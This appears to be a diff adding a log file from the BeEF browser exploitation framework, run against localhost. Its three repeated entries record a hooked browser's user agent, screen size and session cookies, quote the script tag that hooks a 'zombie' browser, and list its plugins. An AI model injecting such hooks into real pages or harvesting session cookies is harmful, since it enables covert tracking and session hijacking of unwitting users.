@@ -1,0 +1,78 @@
+[15/06/15 14:55:48 ::1] ::1
+[15/06/15 14:55:48 ::1] Chrome 43.0.2357.124 - Mozilla/5.0 (Windows NT 10.0
+[15/06/15 14:55:48 ::1] Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
+[15/06/15 14:55:48 ::1] Screen: 1280x720 with 24-bit colour
+[15/06/15 14:55:48 ::1] Requested URL: http://localhost/bf/hook/example.php
+[15/06/15 14:55:48 ::1] Cookie: PHPSESSID=eec2m2dlvtbkj7dkm6dtl3iqf3; a6617_times=1; AJSTAT_ok_times=2; BeEFSession=6u6k3pt04knu8j1fm4k18hg720
+[15/06/15 14:55:48 ::1] HTML Contents: 
+ <br>BeEF Test Page<br><br>
+
+
+	The following code needs to be included in the zombie:<br>
+	<code>
+	&lt;script language='Javascript'
+	src="http://http://localhost/bf//hook/beefmagic.js.php'&gt;&lt;/script&gt;
+    </code>
+    <br>
+    
+
+
+
+[15/06/15 14:55:50 ::1] Module Result: 
+Chrome PDF Viewer
+Shockwave Flash
+Chrome Remote Desktop Viewer
+Native Client
+Chrome PDF Viewer
+[15/06/15 17:20:30 ::1] ::1
+[15/06/15 17:20:30 ::1] Chrome 43.0.2357.124 - Mozilla/5.0 (Windows NT 10.0
+[15/06/15 17:20:30 ::1] Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
+[15/06/15 17:20:30 ::1] Screen: 1280x720 with 24-bit colour
+[15/06/15 17:20:30 ::1] Requested URL: http://localhost/bf/hook/example.php
+[15/06/15 17:20:30 ::1] Cookie: PHPSESSID=eec2m2dlvtbkj7dkm6dtl3iqf3; a6617_times=1; AJSTAT_ok_times=2; BeEFSession=6u6k3pt04knu8j1fm4k18hg720
+[15/06/15 17:20:30 ::1] HTML Contents: 
+ <br>BeEF Test Page<br><br>
+
+
+	The following code needs to be included in the zombie:<br>
+	<code>
+	&lt;script language='Javascript'
+	src="http://http://localhost/bf//hook/beefmagic.js.php'&gt;&lt;/script&gt;
+    </code>
+    <br>
+    
+
+
+
+[15/06/15 17:20:32 ::1] Module Result: 
+Chrome PDF Viewer
+Shockwave Flash
+Chrome Remote Desktop Viewer
+Native Client
+Chrome PDF Viewer
+[15/06/15 18:53:24 ::1] ::1
+[15/06/15 18:53:24 ::1] Chrome 43.0.2357.124 - Mozilla/5.0 (Windows NT 10.0
+[15/06/15 18:53:24 ::1] Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
+[15/06/15 18:53:24 ::1] Screen: 1280x720 with 24-bit colour
+[15/06/15 18:53:24 ::1] Requested URL: http://localhost/bf/hook/example.php
+[15/06/15 18:53:24 ::1] Cookie: PHPSESSID=eec2m2dlvtbkj7dkm6dtl3iqf3; a6617_times=1; AJSTAT_ok_times=2; BeEFSession=6u6k3pt04knu8j1fm4k18hg720
+[15/06/15 18:53:24 ::1] HTML Contents: 
+ <br>BeEF Test Page<br><br>
+
+
+	The following code needs to be included in the zombie:<br>
+	<code>
+	&lt;script language='Javascript'
+	src="http://http://localhost/bf//hook/beefmagic.js.php'&gt;&lt;/script&gt;
+    </code>
+    <br>
+    
+
+
+
+[15/06/15 18:53:26 ::1] Module Result: 
+Chrome PDF Viewer
+Shockwave Flash
+Chrome Remote Desktop Viewer
+Native Client
+Chrome PDF Viewer
